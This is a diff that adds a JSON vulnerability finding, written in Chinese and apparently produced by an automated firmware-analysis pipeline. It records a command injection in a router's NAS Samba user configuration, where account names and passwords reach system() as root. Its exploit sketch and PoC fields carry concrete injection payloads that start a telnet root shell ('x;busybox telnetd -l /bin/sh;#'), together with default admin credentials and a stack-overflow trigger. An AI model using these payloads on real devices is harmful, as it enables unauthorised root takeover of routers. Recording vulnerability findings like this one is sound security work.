@@ -1,0 +1,32 @@
+{
+  "job_id": "3a1f3c822c22",
+  "title": "httpd/uclited NAS Samba 用户配置 smbpasswd 命令注入（NAS 账号密码无过滤拼入 system）",
+  "severity": "high",
+  "confidence": 0.55,
+  "vuln_class": "command-injection",
+  "cwe": "CWE-78",
+  "binary_md5": "9582aa23b0bc2de099b9997b09457d01",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd（0x5471d0）与 uclited（0x4a4b48）的 NAS Samba 用户配置应用函数把配置结构 a1 中的 NAS 账号名（a1[44*i+2]）与密码（a1[44*i+6]）直接拼进 execFormatCmd(\"%s -p %s -a %s\",\"smbpasswd\",pwd,user)。execFormatCmd（httpd 0x5308cc / uclited 0x411658）= vsprintf(s[260]) + system(s)。账号或密码含 shell 元字符（; $() 反引号）即命令注入，以 httpd/uclited 的 root 权限执行；输入超过 255 字符还会造成 vsprintf 栈溢出。字段值来自认证后 Web 的 NAS 共享用户/密码配置（页面 /userRpm/NasFolderSharingRpm.htm 等），无白名单或转义过滤。",
+  "evidence": [
+    "httpd nasSambaSetUserList 0x5471d0: execFormatCmd(\"%s -p %s -a %s\", \"smbpasswd\", (const char *)&a1[44*v5+6], v7=myStrlwr(&a1[44*v5+2]))（多用户循环，-p 为密码字段）",
+    "uclited nasSambaSetUserList 0x4a4b48 同构: execFormatCmd(\"%s -p %s -a %s\", \"smbpasswd\", v1=&a1[44*a1[1]+6], v2)",
+    "execFormatCmd httpd 0x5308cc: vsprintf(s[260], format, arg) 无长度限制；callees 显示调用 tp_systemEx",
+    "uclited execFormatCmd 0x411658: vsprintf(s[260]) + sub_41153C(system)",
+    "fopen \"/tmp/passwd\"\"/tmp/samba/private/smbpasswd\" 写入的账号来源于同一配置结构 a1，且 myStrlwr 仅做小写转换不过滤",
+    "httpd checksec: canary=false nx=false pie=false relro=none"
+  ],
+  "session_id": "s-mt4rda4n-55d3",
+  "function_name": "nasSambaSetUserList",
+  "preconditions": "管理员认证可访问 Web 管理（默认 admin/admin 常未改）；NAS 用户配置页能保存用户/密码到 uclited/httpd 配置结构；Samba 服务启用（nasSambaSetUserList 在配置应用流程中被调用）",
+  "exploit_sketch": "注入 payload 放在 username 字段即可（myStrlwr 只小写化字母，; $() ` 不受影响）：x;telnetd -l /bin/sh; => system 拼出 smbpasswd -p ... -a x;telnetd -l /bin/sh; ...，/bin/sh 在 23 端口监听。无需溢出即 RCE；栈溢出可作为纯故障模式（300 字符 pwd）。httpd/uclited 均以 root 运行。",
+  "poc": "1) 浏览器登录 admin（默认 admin/admin）后访问 NAS 用户设置页；2) 新建/修改 Samba 共享账号，用户名字段填：x;busybox telnetd -l /bin/sh;#（或密码字段填：p$(id>/tmp/pwn).x）；3) 保存触发 httpd nasSambaSetUserList：执行 system(\"smbpasswd -p <pwd> -a x;busybox telnetd -l /bin/sh;# ...\")，23 端口出现 root shell；或把密码填 300 个 A 触发 vsprintf 栈溢出（CANARY/NX 均关闭的 MIPS 构建可直接 RCE）。静态分析，未做动态复核。",
+  "call_chain": "管理员登录 http://<router>/userRpm/NasFolderSharingRpm.htm（NAS 用户配置, HttpAccessPermit 通过） → httpd 解析共享用户/密码进入 NAS 配置结构 a1 → httpd nasSambaSetUserList(0x5471d0)（或经 ucm 回环 IPC 127.0.0.1:51237 → uclited nasSambaSetUserList 0x4a4b48） → execFormatCmd(0x5308cc/0x411658)(\"%s -p %s -a %s\",\"smbpasswd\", password@a1[44i+6], username@a1[44i+2]) → vsprintf(s[260]) → system(s)（root）",
+  "function_addr": "0x5471d0",
+  "id": "F-mt4rye54-c344",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-08-22T19:31:56Z",
+  "history": []
+}
